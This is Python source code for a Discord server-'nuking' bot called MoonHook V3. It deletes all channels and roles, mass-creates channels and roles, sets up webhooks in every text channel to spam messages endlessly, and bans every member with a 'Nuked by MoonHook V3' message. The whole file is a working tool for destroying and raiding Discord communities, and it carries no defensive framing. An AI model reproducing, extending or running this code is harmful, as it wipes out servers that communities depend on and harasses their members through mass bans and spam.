from moonhook_logging import Logger
from typing import List

import discord
import asyncio
import threading
import time

BOT_RUNNING = False

WEBHOOKS: List[discord.Webhook] = []


# nectarinekooky
class DiscordToken:
    def __init__(self, DiscordToken, guild: str):
        self.DiscordToken = DiscordToken
        self.guild = guild


class BotClient(discord.Client):
    async def setup_hook(self):
        self.loop_ref = asyncio.get_running_loop()


def GetGuildByID(guildID: int):
    return client.get_guild(guildID)


async def delete_channels(guild):
    for channel in guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            Logger.Log(
                f"{Logger.rgb_to_ansi(255, 0, 0)}couldnt delete channel! Err: {e}{Logger.ColorReset()}"
            )


async def create_channels(guild, amount, name):
    for i in range(amount):
        try:
            await guild.create_text_channel(name)
        except Exception:
            Logger.Log(
                f"{Logger.rgb_to_ansi(255, 0, 0)}couldnt create a channel{Logger.ColorReset()}"
            )


async def delete_roles(guild):
    for role in guild.roles:
        try:
            if role.name != "@everyone":
                await role.delete()
        except Exception:
            Logger.Log(
                f"{Logger.rgb_to_ansi(255, 0, 0)}couldnt delete a role{Logger.ColorReset()}"
            )


async def create_roles(guild, role_name, amount):
    for i in range(amount):
        try:
            new_role = await guild.create_role(name=role_name)
        except Exception:
            Logger.Log(
                f"{Logger.rgb_to_ansi(255, 0, 0)}couldnt make a role{Logger.ColorReset()}"
            )


async def webhook_exists(channel: discord.TextChannel, name: str) -> bool:
    global WEBHOOKS
    webhooks = await channel.webhooks()
    for webhook in webhooks:
        if webhook.name == name:
            return True
    return False


async def spam_messages(guild, webhookName: str, messageToSpam: str, spamCooldown: int):
    global WEBHOOKS
    text_channels = [ch for ch in guild.channels if isinstance(ch, discord.TextChannel)]
    if not text_channels:
        Logger.Log("No text channels found in guild! (Maybe spam some first..)")

    async def SpamThread(hook: discord.Webhook):
        while True:
            try:
                await hook.send(content=messageToSpam)
                time.sleep(spamCooldown)
            except Exception as e:
                Logger.Log(
                    f"{Logger.rgb_to_ansi(255, 0, 0)}Failed: {e}{Logger.ColorReset()}"
                )

    for channel in text_channels:
        try:
            hookExists = await webhook_exists(channel, webhookName)
            if not hookExists:
                try:
                    hk = await channel.create_webhook(name=webhookName)
                    WEBHOOKS.append(hk)
                    Logger.Log(f"Created hook in: {channel.name}")
                except Exception as e1:
                    Logger.Log(
                        f"{Logger.rgb_to_ansi(255, 0, 0)}Failed to create hook: {e1}{Logger.ColorReset()}"
                    )
        except Exception as e:
            Logger.Log(
                f"{Logger.rgb_to_ansi(255, 0, 0)}Failed: {e}{Logger.ColorReset()}"
            )

    for hook in WEBHOOKS:
        asyncio.run_coroutine_threadsafe(SpamThread(hook), client.loop_ref)


async def ban_everyone(guild):
    totalbanned = 0
    for member in guild.members:
        try:
            await member.ban(
                reason="Nuked by MoonHook V3! https://github.com/U-235Consumer/MoonhookV3"
            )
            totalbanned += 1
        except Exception as e:
            Logger.Log(
                f"{Logger.rgb_to_ansi(255, 0, 0)}Failed to ban user: {member.name}! Reason: {e}{Logger.ColorReset()}"
            )
    Logger.Log(f"Full ban finished! Total banned: {str(totalbanned)}")


intents = discord.Intents.default()
intents.guilds = True
intents.members = True
client = BotClient(intents=intents)


def GetBotClient() -> BotClient:
    return client


async def start_bot(DiscordToken):
    global BOT_RUNNING
    if BOT_RUNNING:
        Logger.Log("Bot is already running!")
        return

    try:
        BOT_RUNNING = True
        await client.start(DiscordToken)
        Logger.Log("Bot started successfully!")
    except discord.LoginFailure:
        BOT_RUNNING = False
        Logger.Log(
            f"{Logger.rgb_to_ansi(255, 0, 0)}invalid bot token dumbass{Logger.ColorReset()}"
        )


async def stop_bot():
    try:
        await client.close()
    except Exception as e:
        Logger.Log(f"{Logger.rgb_to_ansi(255, 0, 0)}Failed to stop bot! Err: {e}")
